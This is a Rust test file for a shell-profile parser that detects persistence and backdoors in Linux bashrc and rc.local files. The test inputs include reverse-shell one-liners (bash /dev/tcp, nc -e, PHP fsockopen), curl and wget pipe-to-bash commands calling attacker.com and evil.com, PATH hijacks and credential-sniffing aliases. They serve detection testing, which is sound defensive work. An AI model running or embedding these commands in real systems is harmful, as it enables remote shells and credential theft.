mod common;
use faramir::parsers::linux::profiles::*;
use std::fs::File;
use std::io::Write;

fn create_temp_script(content: &str, name: &str) -> (std::path::PathBuf, tempfile_guard::FileGuard) {
    let path = std::env::temp_dir().join(format!("{}_{}_{}.sh", name, std::process::id(), common::unique_suffix()));
    {
        let mut f = File::create(&path).unwrap();
        f.write_all(content.as_bytes()).unwrap();
    }
    let guard = tempfile_guard::FileGuard(path.clone());
    (path, guard)
}

mod tempfile_guard {
    pub struct FileGuard(pub std::path::PathBuf);
    impl Drop for FileGuard {
        fn drop(&mut self) {
            let _ = std::fs::remove_file(&self.0);
        }
    }
}

// ─── Evaluate Shell Line Tests ────────────────────────────────────────────────

#[test]
fn test_eval_dev_tcp() {
    assert_eq!(evaluate_shell_line("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"), Some("bash_socket_reverse_shell"));
}

#[test]
fn test_eval_dev_udp() {
    assert_eq!(evaluate_shell_line("cat < /dev/udp/10.0.0.1/53"), Some("bash_socket_reverse_shell"));
}

#[test]
fn test_eval_bash_i() {
    assert_eq!(evaluate_shell_line("/bin/bash -i"), Some("interactive_shell_spawn"));
}

#[test]
fn test_eval_sh_i() {
    assert_eq!(evaluate_shell_line("/bin/sh -i"), Some("interactive_shell_spawn"));
}

#[test]
fn test_eval_zsh_i() {
    assert_eq!(evaluate_shell_line("zsh -i"), Some("interactive_shell_spawn"));
}

#[test]
fn test_eval_netcat_nc() {
    assert_eq!(evaluate_shell_line("nc -e /bin/sh 10.0.0.1 1337"), Some("netcat_network_execution"));
}

#[test]
fn test_eval_netcat_ncat() {
    assert_eq!(evaluate_shell_line("ncat --exec /bin/bash 10.0.0.1 4444"), Some("netcat_network_execution"));
}

#[test]
fn test_eval_netcat_netcat() {
    assert_eq!(evaluate_shell_line("netcat 10.0.0.1 80 -e /bin/sh"), Some("netcat_network_execution"));
}

#[test]
fn test_eval_curl_pipe_bash() {
    assert_eq!(evaluate_shell_line("curl -s http://attacker.com/rev.sh | bash"), Some("curl_piped_or_download_exec"));
}

#[test]
fn test_eval_curl_pipe_sh() {
    assert_eq!(evaluate_shell_line("curl http://attacker.com/rev.sh | sh"), Some("curl_piped_or_download_exec"));
}

#[test]
fn test_eval_curl_tmp_output() {
    assert_eq!(evaluate_shell_line("curl http://evil.com/x -o /tmp/x.sh"), Some("curl_piped_or_download_exec"));
}

#[test]
fn test_eval_curl_dev_shm_output() {
    assert_eq!(evaluate_shell_line("curl http://evil.com/x -o /dev/shm/x.sh"), Some("curl_piped_or_download_exec"));
}

#[test]
fn test_eval_wget_pipe_bash() {
    assert_eq!(evaluate_shell_line("wget -qO- http://attacker.com/rev.sh | bash"), Some("wget_piped_or_download_exec"));
}

#[test]
fn test_eval_wget_pipe_sh() {
    assert_eq!(evaluate_shell_line("wget -O - http://attacker.com/rev.sh | sh"), Some("wget_piped_or_download_exec"));
}

#[test]
fn test_eval_wget_tmp_output() {
    assert_eq!(evaluate_shell_line("wget http://evil.com/x -O /tmp/miner"), Some("wget_piped_or_download_exec"));
}

#[test]
fn test_eval_wget_dev_shm_output() {
    assert_eq!(evaluate_shell_line("wget http://evil.com/x -O /dev/shm/miner"), Some("wget_piped_or_download_exec"));
}

#[test]
fn test_eval_base64_decode_dash_d() {
    assert_eq!(evaluate_shell_line("echo 'ZWNobyBoaQo=' | base64 -d | sh"), Some("base64_encoded_payload"));
}

#[test]
fn test_eval_base64_decode_flag() {
    assert_eq!(evaluate_shell_line("base64 --decode /tmp/encoded"), Some("base64_encoded_payload"));
}

#[test]
fn test_eval_python_c() {
    assert_eq!(evaluate_shell_line("python -c 'import socket...'"), Some("one_liner_interpreter_payload"));
}

#[test]
fn test_eval_python3_c() {
    assert_eq!(evaluate_shell_line("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"), Some("one_liner_interpreter_payload"));
}

#[test]
fn test_eval_perl_e() {
    assert_eq!(evaluate_shell_line("perl -e 'use Socket...'"), Some("one_liner_interpreter_payload"));
}

#[test]
fn test_eval_ruby_e() {
    assert_eq!(evaluate_shell_line("ruby -e 'spawn(\"/bin/sh\")'"), Some("one_liner_interpreter_payload"));
}

#[test]
fn test_eval_php_r() {
    assert_eq!(evaluate_shell_line("php -r '$sock=fsockopen(\"10.0.0.1\",4444);'"), Some("one_liner_interpreter_payload"));
}

#[test]
fn test_eval_path_tmp_hijack() {
    assert_eq!(evaluate_shell_line("export PATH=/tmp:$PATH"), Some("path_environment_hijack"));
}

#[test]
fn test_eval_path_dev_shm_hijack() {
    assert_eq!(evaluate_shell_line("export PATH=/dev/shm:$PATH"), Some("path_environment_hijack"));
}

#[test]
fn test_eval_path_dot_hijack() {
    assert_eq!(evaluate_shell_line("export PATH=.:$PATH"), Some("path_environment_hijack"));
}

#[test]
fn test_eval_alias_sudo() {
    assert_eq!(evaluate_shell_line("alias sudo=\"logger -p auth.crit 'sudo called'; sudo\""), Some("credential_harvesting_alias"));
}

#[test]
fn test_eval_alias_su() {
    assert_eq!(evaluate_shell_line("alias su=\"/opt/sniff_su.sh\""), Some("credential_harvesting_alias"));
}

#[test]
fn test_eval_alias_ssh() {
    assert_eq!(evaluate_shell_line("alias ssh=\"strace -e read,write ssh\""), Some("credential_harvesting_alias"));
}

#[test]
fn test_eval_tmp_script_exec() {
    assert_eq!(evaluate_shell_line("/tmp/.hidden.sh &"), Some("temp_directory_script_execution"));
}

#[test]
fn test_eval_dev_shm_script_exec() {
    assert_eq!(evaluate_shell_line("/dev/shm/run.sh"), Some("temp_directory_script_execution"));
}

#[test]
fn test_eval_var_tmp_script_exec() {
    assert_eq!(evaluate_shell_line("/var/tmp/setup.sh &"), Some("temp_directory_script_execution"));
}

#[test]
fn test_eval_benign_echo() {
    assert_eq!(evaluate_shell_line("echo 'Welcome to Ubuntu'"), None);
}

#[test]
fn test_eval_benign_export() {
    assert_eq!(evaluate_shell_line("export LANG=en_US.UTF-8"), None);
}

#[test]
fn test_eval_benign_umask() {
    assert_eq!(evaluate_shell_line("umask 022"), None);
}

#[test]
fn test_eval_benign_comment() {
    assert_eq!(evaluate_shell_line("# curl http://example.com"), None);
}

#[test]
fn test_eval_empty_string() {
    assert_eq!(evaluate_shell_line(""), None);
}

#[test]
fn test_eval_whitespace_only() {
    assert_eq!(evaluate_shell_line("   \t  "), None);
}

// ─── Parse Script File Tests ──────────────────────────────────────────────────

#[test]
fn test_parse_profile_with_backdoor() {
    let (p, _g) = create_temp_script("# Profile\nexport FOO=1\ncurl http://evil.com/x.sh | bash\n", "bashrc");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs.len(), 1);
    assert_eq!(evs[0].artifact, "linux:shell:curl_piped_or_download_exec");
}

#[test]
fn test_parse_profile_clean() {
    let (p, _g) = create_temp_script("# Clean bashrc\nexport EDITOR=vim\nalias ll='ls -la'\n", "clean_bashrc");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs.len(), 0);
}

#[test]
fn test_parse_profile_empty_err() {
    let (p, _g) = create_temp_script("", "empty_profile");
    let err = parse_shell_script(&p, "HOST").unwrap_err();
    assert_eq!(err.code(), "ERR_LNX_EMPTY_FILE");
}

#[test]
fn test_parse_profile_not_found_err() {
    let p = std::path::PathBuf::from("/non/existent/bashrc_123");
    let err = parse_shell_script(&p, "HOST").unwrap_err();
    assert_eq!(err.code(), "ERR_LNX_IO_NOT_FOUND");
}

#[test]
fn test_parse_profile_multiple_malicious_lines() {
    let content = "alias sudo='/tmp/s'\nexport PATH=/tmp:$PATH\npython3 -c 'exit()'\n";
    let (p, _g) = create_temp_script(content, "multi_bad");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs.len(), 3);
}

#[test]
fn test_parse_profile_rc_local_behavior() {
    let path = std::env::temp_dir().join(format!("rc.local_{}", std::process::id()));
    {
        let mut f = File::create(&path).unwrap();
        f.write_all(b"#!/bin/sh\n/usr/local/bin/backdoor &\nexit 0\n").unwrap();
    }
    // Rename to actual rc.local in temp
    let final_path = std::env::temp_dir().join("rc.local");
    let _ = std::fs::copy(&path, &final_path);
    let _ = std::fs::remove_file(&path);

    let evs = parse_shell_script(&final_path, "HOST").unwrap();
    let _ = std::fs::remove_file(&final_path);

    assert_eq!(evs.len(), 1);
    assert_eq!(evs[0].artifact, "linux:boot:rc_local");
    assert_eq!(evs[0].subject_username, "root");
}

#[test]
fn test_parse_profile_user_is_user() {
    let (p, _g) = create_temp_script("bash -i >& /dev/tcp/1.1.1.1/80 0>&1\n", "bashrc_user");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs[0].subject_username, "user");
}

#[test]
fn test_parse_profile_parentprocess_is_shell() {
    let (p, _g) = create_temp_script("python -c 'print(1)'\n", "bashrc_parent");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs[0].parentprocessname, "shell");
}

#[test]
fn test_parse_profile_line_number_in_commandline() {
    let (p, _g) = create_temp_script("# 1\n# 2\nnc -e /bin/sh 1.2.3.4 9999\n", "line_num");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert!(evs[0].commandline.as_ref().unwrap().contains("line 3"));
}

#[test]
fn test_parse_profile_wget_and_sh() {
    let (p, _g) = create_temp_script("wget http://bad.com/p -O /tmp/p && /tmp/p.sh &\n", "wget_test");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert!(!evs.is_empty());
}

#[test]
fn test_parse_profile_base64_decode_in_script() {
    let (p, _g) = create_temp_script("eval $(echo abc | base64 -d)\n", "b64_test");
    let evs = parse_shell_script(&p, "HOST").unwrap();
    assert_eq!(evs.len(), 1);
    assert_eq!(evs[0].artifact, "linux:shell:base64_encoded_payload");
}
